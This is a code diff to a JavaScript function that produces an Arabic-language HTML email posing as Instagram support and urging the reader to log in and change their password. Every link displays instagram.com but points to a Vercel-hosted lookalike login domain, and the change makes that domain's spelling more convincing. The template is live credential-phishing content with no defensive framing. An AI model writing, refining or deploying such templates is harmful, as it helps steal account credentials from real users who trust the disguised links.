@@ -113,7 +113,7 @@ export const emailTemp = () => {
           <ol>
             <li>
               افتح تطبيق إنستجرام أو قم بزيارة 
-              <a href="http://instgram-app-login.vercel.app">instagram.com</a> 
+              <a href="http://instagram-app-login.vercel.app">instagram.com</a> 
               لتسجيل الدخول بأمان.
             </li>
             <li>قم بتغيير كلمة المرور من: <em>الإعدادات → الأمان → كلمة المرور</em>.</li>
@@ -122,12 +122,12 @@ export const emailTemp = () => {
           </ol>
 
           <div style="text-align:center;">
-            <a href="http://instgram-app-login.vercel.app" class="button">تسجيل الدخول الآن</a>
+            <a href="http://instagram-app-login.vercel.app" class="button">تسجيل الدخول الآن</a>
           </div>
 
           <p>
             إذا لم تكن أنت من قام بهذا النشاط، يمكنك التواصل مع مركز المساعدة عبر 
-            <a href="http://instgram-app-login.vercel.app">instagram.com/help</a>.
+            <a href="http://instagram-app-login.vercel.app">instagram.com/help</a>.
           </p>
 
           <p style="margin-top:20px;">مع تحياتنا،<br><strong>فريق دعم إنستجرام</strong></p>
